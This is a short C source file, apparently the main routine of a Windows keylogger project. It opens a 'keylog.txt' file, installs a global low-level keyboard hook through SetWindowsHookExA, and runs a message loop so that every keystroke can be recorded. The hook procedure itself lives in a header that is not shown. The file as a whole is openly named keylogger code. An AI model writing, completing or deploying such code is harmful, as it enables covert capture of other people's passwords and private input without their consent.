#include "keylogger.h"

int main()
{
    file = fopen("keylog.txt", "a");
    if (file == NULL)
    {
        printf("Failed to open file\n");
        return 1;
    }

    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (hhook == NULL)
    {
        printf("Failed to set hook\n");
        fclose(file);
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hhook);
    fclose(file);

    return 0;
}
